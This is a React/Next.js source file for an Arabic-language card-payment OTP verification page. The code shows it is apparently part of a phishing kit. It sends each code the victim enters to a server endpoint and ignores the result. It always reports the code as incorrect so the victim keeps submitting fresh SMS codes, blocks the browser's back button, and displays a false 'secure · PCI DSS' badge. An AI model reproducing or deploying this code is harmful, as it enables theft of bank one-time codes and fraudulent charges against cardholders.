"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Lock } from "lucide-react";

const fmt = (n: number) => n.toLocaleString("ar-SA");

function formatDate(iso: string) {
  return new Date(iso).toLocaleString("ar-SA", {
    year: "numeric", month: "long", day: "numeric",
    hour: "2-digit", minute: "2-digit",
  });
}

export default function VerifyPage() {
  const router = useRouter();
  const [phase, setPhase] = useState<"otp">("otp");
  const [data, setData] = useState<{ orderId?: string; _id?: string; amount: number; last4: string; date: string; phone: string; customerName?: string } | null>(null);
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(41);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [cooldown, setCooldown] = useState(0);

  useEffect(() => {
    const raw = sessionStorage.getItem("verify_data");
    if (!raw) { router.replace("/cart"); return; }
    setData(JSON.parse(raw));
    history.pushState(null, "", window.location.href);
    const block = () => history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", block);
    return () => window.removeEventListener("popstate", block);
  }, [router]);

  useEffect(() => {
    if (phase !== "otp" || timer <= 0) return;
    const t = setTimeout(() => setTimer(s => s - 1), 1000);
    return () => clearTimeout(t);
  }, [phase, timer]);

  const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(timer % 60).padStart(2, "0")}`;

  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown(s => s - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  const handleSubmit = async () => {
    const digits = otp.replace(/\D/g, "");
    if (digits.length !== 4 && digits.length !== 6) { setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام"); return; }

    const attemptsKey = `verify_attempts_${data?.orderId}`;
    const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0") + 1;
    sessionStorage.setItem(attemptsKey, String(attempts));

    if (attempts > 6) {
      sessionStorage.removeItem(attemptsKey);
      sessionStorage.removeItem("verify_data");
      setError("لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ");
      let countdown = 5;
      const interval = setInterval(() => {
        countdown -= 1;
        if (countdown <= 0) {
          clearInterval(interval);
          router.replace("/cart");
        } else {
          setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
        }
      }, 1000);
      setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
      return;
    }

    setSubmitting(true);
    setCooldown(4);
    try {
      await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: digits, orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
      });
    } catch {}
    setSubmitting(false);
    setOtp("");
    setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
    await new Promise(r => setTimeout(r, 4000));
    setError("");
  };

  const maskedPhone = data?.phone
    ? data.phone.slice(0, 3) + "****" + data.phone.slice(-3)
    : "05*****";

  /* ── Loading fallback if data not ready ── */
  if (!data) return null;

  /* ── OTP ── */
  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 pt-4 pb-8" dir="rtl">
      <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">

        {/* Header */}
        <div className="px-6 pt-6 pb-4">
          <h2 className="text-sm sm:text-base font-black text-[#1A2E44] pb-3 border-b border-gray-200 text-center">
            تأكيد عملية الشراء
          </h2>
          <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
            تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
            <span className="font-bold text-[#1A2E44]" dir="ltr">{maskedPhone}</span> لإتمام المعاملة.
          </p>
        </div>

        {/* Details Card */}
        <div className="mx-6 mb-5 border border-gray-100 divide-y divide-gray-100">
          <Row label="المبلغ">
            <span className="font-black text-[#1A2E44] text-xs sm:text-sm">{fmt(data.amount)} <span className="text-[11px] sm:text-xs font-medium text-gray-400">ر.س</span></span>
          </Row>
          <Row label="التاريخ">
            <span className="text-[11px] sm:text-xs text-gray-500">{formatDate(data.date)}</span>
          </Row>
          <Row label="وسيلة الدفع">
            <span className="font-mono text-xs sm:text-sm text-[#1A2E44] tracking-widest" dir="ltr">
              •••• •••• •••• {data.last4}
            </span>
          </Row>
        </div>

        {/* OTP Input */}
        <div className="px-6 pb-5 space-y-4">
          <div>
            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Verification Code</p>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              placeholder="أدخل رمز التحقق"
              value={otp}
              onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
              onBlur={() => {
                const d = otp.replace(/\D/g, "");
                if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
              }}
              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
              dir="ltr"
            />
            {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
          </div>

          <div className="text-center">
            {timer > 0 ? (
              <p className="text-xs text-gray-400">
                إعادة الإرسال خلال <span className="font-black text-[#1A2E44] font-mono">{timerStr}</span>
              </p>
            ) : (
              <button onClick={async () => {
                setTimer(41);
                await fetch("/api/resend", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
                });
              }} className="text-xs font-bold text-[#1A2E44] underline underline-offset-2">
                إعادة إرسال الرمز
              </button>
            )}
          </div>

          <button
            onClick={handleSubmit}
            disabled={submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
            className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
            style={{ background: "#1A2E44" }}
          >
            <Lock size={13} />
            {submitting ? "جاري التحقق..." : cooldown > 0 ? <span className="font-mono tabular-nums">{cooldown}</span> : "إتمام الدفع"}
          </button>

          <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
            <Lock size={9} /> اتصال مشفّر وآمن · PCI DSS
          </p>
        </div>

      </div>
    </div>
  );
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between px-4 py-3">
      <span className="text-xs text-gray-400 font-medium">{label}</span>
      <span>{children}</span>
    </div>
  );
}
